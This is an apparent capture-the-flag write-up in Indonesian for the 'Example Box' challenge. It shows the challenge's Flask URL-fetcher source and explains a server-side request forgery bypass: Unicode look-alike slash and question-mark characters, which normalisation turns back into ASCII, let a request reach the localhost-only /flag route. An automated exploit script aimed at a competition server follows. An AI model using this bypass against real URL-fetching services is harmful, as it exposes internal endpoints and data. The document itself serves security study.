# Cyber Jawara International - Example Box - Writeup

Diberikan sebuah web yang bisa melakukan fetch ke url tertentu, namun host harus `example.com` dan schema harus `http`, dan path harus `/`, terdapat kerentanan SSRF pada challenge ini, namun kita harus bisa melakukan bypass yang mana host harus `example.com`, dan menggantinya dengan `localhost/flag`, untuk mendapatkan flag

## Source Code

Diberikan source code untuk challenge ini sebagai berikut
```python
from flask import Flask, abort, render_template, request, Response
from re import sub
from unidecode import unidecode
from urllib3.util import parse_url
import requests

app = Flask(__name__)

allowed_hostname = ["example.com"]
allowed_path = ["", "/"]
fallback = "http://example.com/"
cache = {}

def normalize(token):
    if token == None:
        token = ""
    return sub(r'\s+', '', unidecode(str(token)))

def filter_url(url):
    parsed_url = parse_url(url)
    scheme = normalize(parsed_url.scheme)
    host = normalize(parsed_url.host)
    path = normalize(parsed_url.path)
    filtered_url = url
    print(f'\nscheme url {scheme}')
    print(f'host url {host}')
    print(f'path url {path}')
    if not scheme.startswith('http'):
        print('\nfilter http')
        filtered_url = fallback
    if not host in allowed_hostname:
        print('filter host')
        filtered_url = fallback
    if not path in allowed_path:
        print('filter path')
        filtered_url = fallback
    return normalize(filtered_url)

@app.route('/', methods=['GET', 'POST'])
def index():
    url = request.form.get('url', '')
    return render_template('index.html', url=url)

@app.route('/fetch_url')
def fetch_url():
    url = request.args.get('url')
    filtered_url = filter_url(url)
    try:
        if filtered_url in cache:
            response = cache[filtered_url]
            print('\nif pertama')
            print(f'filtered url {filtered_url}')
        else:
            response = requests.get(filtered_url)
            cache[filtered_url] = response
            print('\nmasuk else')
            print(f'filtered url {filtered_url}')
        print(response.headers.get('Content-Type'))
        return Response(response.content,
                        status=response.status_code,
                        content_type=response.headers.get('Content-Type'))
    except requests.exceptions.RequestException as e:
        return f"Error fetching the URL: {e}", 500

@app.route('/flag')
def flag():
    if request.remote_addr != '127.0.0.1':
        abort(403)
    with open('/flag.txt', 'r') as flag:
        return flag.read()

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=20002)
```

Pada kode diatas `/flag` hanya bisa diakses oleh localhost, dan terdapat filter url, yang mana host haruslah `example.com`, schema haruslah `http`, dan path harus `/` atau kosong.

pada challenge ini hampir mustahil untuk melakukan SSRF karena banyak nya filter yang mana mengharuskan host `example.com`

## Payload

Setelah explorasi lebih lanjut dicoba melakukan SSRF dengan bantuan unicode berikut gambarannya

```bash
http://127.0.0.1:20002/flag?@example.com
```

pada payload diatas web app akan mengenali example.com sebagai host, dan akan melakukan redirect ke halaman example.com, dikarenakan adanya @ pada awalannya. kita sudah berhasil melakukan bypass filter `host`.

namun tantangan selanjutnya adalah untuk melakukan disable redirect dan mengarahkan web app untuk melakukan fetch `127.0.0.1` namun host tetap `example.com`

kita bisa melakukan encoding ke unicode untuk karakter `/` dan `?`, ini harus dilakukan dengan tujuan web appa akan mengenali url sebagai berikut

```
protocol://username:password@host:port/path?query#fragment
```

untuk `/` ktia bisa menggantinya dengan Division Slash (U+2215)
untuk `?` kita bisa menggantinya dengan Small Question Mark (U+FE56)

berikut payload akhirnya

```bash
http://127.0.0.1:20002∕flag﹖@example.com
```

## Automated Exploit
```python
import requests

# URL endpoint
endpoint = "http://68.183.177.211:20002/fetch_url"  # Pastikan URL ini benar, sesuai dengan host server Anda

# URL yang ingin di-fetch
url_to_fetch = "http://127.0.0.1:20002⁄flag﹖@example.com"  # Gantilah dengan URL yang ingin Anda request

# Membuat request ke endpoint dengan URL sebagai parameter
try:
    response = requests.get(endpoint, params={'url': url_to_fetch})
    if response.status_code == 200:
        print("Content-Type:", response.headers['Content-Type'])
        print("Response Content:", response.text)
    else:
        print(f"Failed to fetch URL. Status code: {response.status_code}")
        print("Error message:", response.text)
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
```